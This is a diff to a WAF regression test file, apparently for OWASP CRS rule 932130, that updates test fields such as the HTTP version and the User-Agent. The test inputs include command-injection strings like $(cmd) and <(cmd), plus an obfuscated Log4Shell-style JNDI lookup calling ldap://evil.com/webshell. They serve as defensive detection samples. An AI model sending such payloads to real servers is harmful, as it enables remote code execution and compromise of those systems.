@@ -17,7 +17,7 @@ tests:
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             uri: "/get?932130-1=$(cmd)"
-            protocol: "http"
+            version: HTTP/1.0
           output:
             log_contains: 'id "932130"'
   - test_title: 932130-2
@@ -33,7 +33,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             uri: "/post"
             data: "932130-2=${cmd}"
-            protocol: "http"
+            version: HTTP/1.0
           output:
             log_contains: 'id "932130"'
   - test_title: 932130-3
@@ -49,7 +49,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
               Cookie: "931120-3=<(cmd)"
             uri: "/get"
-            protocol: "http"
+            version: HTTP/1.0
           output:
             log_contains: 'id "932130"'
   - test_title: 932130-4
@@ -65,7 +65,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
               Cookie: ">(cmd)=931120-4"
             uri: "/get"
-            protocol: "http"
+            version: HTTP/1.0
           output:
             log_contains: 'id "932130"'
   - test_title: 932130-5
@@ -81,7 +81,7 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             uri: "/post"
             data: "932130-5=Some text (in brackets)."
-            protocol: "http"
+            version: HTTP/1.0
           output:
             no_log_contains: 'id "932130"'
   - test_title: 932130-6
@@ -93,12 +93,13 @@ tests:
             headers:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
               Host: "localhost"
-              User-Agent: ModSecurity CRS 3 Tests
+              User-Agent: "OWASP CRS test agent"
               Content-Type: application/json
             method: POST
             port: 80
             uri: "/post"
             data: '{"foo": "${:1337:-x$}{jndi:ldap://evil.com/webshell}"}'
+            version: HTTP/1.0
           output:
             log_contains: 'id "932130"'
   - test_title: 932130-7
